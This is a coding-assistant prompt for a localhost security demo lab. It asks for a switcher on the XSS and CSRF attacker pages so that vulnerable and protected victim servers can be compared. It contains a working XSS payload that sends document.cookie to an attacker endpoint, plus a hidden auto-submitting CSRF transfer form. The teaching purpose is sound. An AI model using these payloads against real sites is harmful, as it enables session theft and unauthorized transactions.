# Cursor Prompt: Add Victim Switcher to All Attacker Pages

## Context

Part of the security attack demonstration lab at
https://github.com/EverythingFromDayOne/demo-attacked-web.

The clickjacking attacker page (port 3014) already has a bottom-left
switcher that lets you toggle between the vulnerable victim (:3013, dark
button) and the protected victim (:3015, red button) without restarting
any server. Add the same switcher to all four remaining attacker pages:
stored XSS, reflected XSS, SVG upload XSS, and CSRF.

---

## Switcher UI spec (match clickjacking exactly)

Fixed position, bottom-left corner of every attacker page:
```css
position: fixed;
bottom: 1rem;
left: 1rem;
display: flex;
gap: 0.5rem;
z-index: 9999;
```

Two buttons per page:
- **Vulnerable button** — dark background (`#1e293b`), white text, border
  `#334155`. Highlighted (white background, dark text) when active.
- **Protected button** — red background (`#dc2626`), white text. Highlighted
  (brighter red `#ef4444`, white text) when active.

Button style: `padding: 0.4rem 0.85rem; border-radius: 6px; font-size: 0.8rem; font-weight: 600; cursor: pointer; border: 1px solid`.

Default active state: Vulnerable button.

---

## File 1 — `xss/stored/attacker.html`

Ports: Vulnerable = 3001, Protected = 3003.

**Switcher behavior:**
- Clicking either button opens the corresponding victim server in a new tab:
  `window.open('http://localhost:PORT', '_blank')`
- The active button reflects whichever was clicked last (purely cosmetic —
  last-opened tab is highlighted).
- Keep the button labels: `Vulnerable (:3001)` and `Protected (:3003)`.

No other changes to the existing page logic. The attacker dashboard
(stolen cookies display, polling) stays exactly as-is.

---

## File 2 — `xss/reflected/attacker.html`

Ports: Vulnerable = 3004, Protected = 3006. Attacker = 3005.

**Switcher behavior:**
The reflected XSS attacker page has a payload/phishing URL section. The
switcher must update those URLs live when toggled — no page reload.

Currently the page calls `GET /api/payloads` (or similar) to fetch attack
URLs targeting port 3004. Replace that server-fetch with **client-side URL
generation** so the victim port can change dynamically:

```js
const ATTACKER_PORT = 3005;
let victimPort = 3004;  // default: vulnerable

function buildImgPayload() {
  return `<img src=x onerror="new Image().src='http://localhost:${ATTACKER_PORT}/steal?c='+encodeURIComponent(document.cookie)">`;
}

function buildAttackUrl() {
  return `http://localhost:${victimPort}/search?q=${encodeURIComponent(buildImgPayload())}`;
}

function refreshPayloadDisplay() {
  // update whichever element shows the attack URL / phishing link
}
```

When the user switches to Protected (:3006):
- `victimPort = 3006`
- Re-render the attack URL pointing to 3006
- The URL now loads the protected server's `/search` — the payload renders
  as plain text, no script fires, no cookie stolen
- This makes it immediately obvious the protected server neutralises the attack

Add a note next to the URL display when port 3006 is active:
`"⚠️ Protected server — payload will render as plain text (htmlEncode applied)"`

Keep all existing polling and stolen-cookie display logic unchanged.

---

## File 3 — `xss/svg-upload/attacker-server.js` (inline HTML)

Ports: Vulnerable = 3007, Protected = 3009.

**Switcher behavior:**
- Clicking either button opens the corresponding victim in a new tab:
  `window.open('http://localhost:PORT', '_blank')`
- The active button reflects whichever was last opened.
- Labels: `Vulnerable (:3007)` and `Protected (:3009)`.

No other changes to existing logic (payload SVG download link, stolen
cookies display, polling all stay as-is).

---

## File 4 — `csrf/attacker-server.js` — LURE page (`GET /lure`)

Ports: Vulnerable = 3010, Protected = 3012.

This is the most impactful switcher in the lab. The lure page has a hidden
form that POSTs to `/transfer`. The switcher changes the form's `action`
between the vulnerable and protected NetBank servers live — no restart needed.
You can demonstrate the attack succeeding AND being blocked in the same tab.

**Switcher behavior:**

```js
let targetPort = 3010;  // default: vulnerable

function updateFormAction() {
  document.getElementById('csrf-form').action =
    `http://localhost:${targetPort}/transfer`;
}

// On switch to Protected (3012):
// targetPort = 3012
// updateFormAction()
// also reset the result display so a fresh attempt can be made
```

After the form submits, detect the outcome:

The form submission is cross-origin, so the response cannot be read directly.
Instead, after the form `submit` event fires, wait 1200ms then poll
`http://localhost:${targetPort}/api/account` via fetch to check the balance.

- If balance dropped below $50,000 → show green success banner:
  `"✅ Transfer sent — $9,000 stolen. Return to NetBank to confirm."`
- If fetch returns 403 or the balance is unchanged → show red blocked banner:
  `"🛡️ Attack blocked — CSRF token validation failed (403 Forbidden)"`
- If fetch fails entirely (server not running) → show:
  `"⚠️ Could not reach localhost:${targetPort} — is the server running?"`

Add a "Reset / Try Again" button that appears after each attempt, which
re-enables the form and clears the result banner.

Labels: `Vulnerable (:3010)` and `Protected (:3012)`.

Also add the same switcher to the main CSRF dashboard page (`GET /`) with
the same port labels, linking to the corresponding NetBank instance.

---

## Consistency note

All four switchers must look and behave identically to the clickjacking one:
same fixed bottom-left position, same button styling, same active-state
highlight. A user who sees the pattern once should immediately recognise it
on every attacker page.
